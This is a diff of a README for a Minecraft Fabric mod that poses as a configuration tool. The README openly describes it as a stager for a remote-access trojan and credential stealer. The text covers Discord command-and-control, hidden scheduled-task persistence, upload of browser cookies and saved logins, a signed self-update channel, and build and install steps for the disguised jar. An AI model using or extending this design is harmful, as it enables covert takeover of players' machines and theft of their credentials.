@@ -6,7 +6,7 @@ Fabric client mod for Minecraft 1.20.1. It presents itself as a configuration sy
 
 The project produces two artifacts:
 
-- **Mod** (`serverpackcore-0.1.2.jar`): loader and stager. The mixin on `MinecraftClient.tick` waits until in a world, waits a random 20 to 60 seconds and, once per session, extracts and launches the agent. It contains no C2 or stealing logic.
+- **Mod** (`serverpackcore-0.1.3.jar`): loader and stager. The mixin on `MinecraftClient.tick` waits until in a world, waits a random 20 to 60 seconds and, once per session, extracts and launches the agent. It contains no C2 or stealing logic.
 - **Agent** (`agent.jar`, embedded as `serverpackcore/agent.bin`): independent Java process with the RAT and the stealer. Pure Java, no dependencies; it does not reference `net.minecraft`.
 
 Every reference to `net.minecraft` is confined to the mixin and the entrypoint.
@@ -21,9 +21,9 @@ The agent writes `alive.txt` with the game PID and its own. The `spc-agent.lock`
 
 ## C2 over Discord
 
-The configuration lives in `agent/src/main/java/com/serverpackcore/agent/DiscordConfig.java` and is burned in:
+The credentials are not committed. The build generates `DiscordSecrets.java` from, in order: `local.properties` at the repo root, the `SPC_BOT_TOKEN`, `SPC_GUILD_ID` and `SPC_CATEGORY_ID` environment variables, or the `SPC_PLACEHOLDER` fallback. `local.properties.example` shows the keys; a plain checkout without credentials still compiles. `DiscordConfig` aliases the generated constants.
 
-- `BOT_TOKEN`, `GUILD_ID`, `CATEGORY_ID`.
+`./gradlew checkSecrets` fails when any credential is missing or still a placeholder, and `./gradlew release` runs it before `build`.
 
 The primary transport is a single Gateway WebSocket per agent, with no gateway on the polling thread or the command pool. On first start it creates a channel under the category, registers its own webhook for attachments and sends a system embed. If channel creation fails, it creates a shared one with the `spc-shared-` prefix.
 
@@ -58,6 +58,20 @@ The agent marks `persist` in `state.json` and regenerates the launcher and task 
 It is not invisible to everything either: `schtasks /query`, the `C:\Windows\System32\Tasks` tree and Autoruns still see it. Real hiding requires services or `Winlogon\Shell`/`Userinit` (HKLM, with admin) or a permanent WMI subscription.
 
 If another pack leaves `wscript`/`.vbs` startups, `persist on` lists them and warns if their path no longer exists or if they reuse our directory. They coexist unless they kill `java`/`javaw` processes or step on the `ServerPackCore` task/value.
+
+## Self-update
+
+`DiscordConfig.UPDATE_MANIFEST_URL` points to `https://github.com/uloaeth/server-pack-core/releases/latest/download/update.json`.
+
+The manifest is signed with RSA-3072. The private key stays offline at `~/.config/spc/update-signing-key.pem` and is never committed; the public key lives at `agent/src/main/resources/serverpackcore/update-public.pem`.
+
+Public key fingerprint (SHA-256 of the DER SubjectPublicKeyInfo):
+
+```
+SHA256:4b21192f465959642cc3c484f67586b85fa4b52208cb79bde91feb80c490b154
+```
+
+Updates are manual by default (`update`); `update auto on` opts in every 24 h. The first install of 0.1.3 is manual.
 
 ## Requirements
 
@@ -96,13 +110,13 @@ Requires JDK 21+ in `JAVA_HOME`; an older JDK fails the build with an explicit m
 JAVA_HOME=/path/to/jdk21-or-newer ./gradlew build
 ```
 
-The root task builds `agent/` with a separate Gradle build and copies `agent.jar` to `src/main/resources/serverpackcore/agent.bin` before `processResources`. The final jar is left in `build/libs/serverpackcore-0.1.2.jar`.
+The root task builds `agent/` with a separate Gradle build and copies `agent.jar` to `src/main/resources/serverpackcore/agent.bin` before `processResources`. The final jar is left in `build/libs/serverpackcore-0.1.3.jar`.
 
 ## Installation
 
 1. Create a Fabric Loader 0.20.1 profile for Minecraft 1.20.1.
 2. Install Fabric API 0.92.12+1.20.1 in the profile (optional).
-3. Copy `build/libs/serverpackcore-0.1.2.jar` to the profile's `mods/` folder.
+3. Copy `build/libs/serverpackcore-0.1.3.jar` to the profile's `mods/` folder.
 
 ## Tests
 
@@ -135,7 +149,7 @@ For manual tests of commands sent through a webhook, start the agent with `-Dspc
 - GPU and public IP depend on external commands or services; without network or `wmic`/`lspci` they stay `unknown`.
 - `screenshot` requires a graphical session; headless environments return an error.
 - If the gateway is down, the REST fallback adds latency (2 s active, 30 s idle).
-- The bot token and IDs are compiled in; changing them requires rebuilding the agent.
+- The bot token and IDs are compiled in at build time; changing them requires rebuilding the agent.
 - Cookies and `Login Data` are uploaded encrypted. `keys.txt` opens `v10`; Chrome 127+ `v20` (App-Bound) cookies are not decrypted with DPAPI alone.
 - On Linux the launcher uses `setsid nohup`; if the environment lacks them, the process may die with the game.
 - Windows persistence depends on `wscript.exe`: if Windows Script Host is disabled, the entry does not start. Copying `javaw.exe` alone is not a fallback because it needs the full runtime.
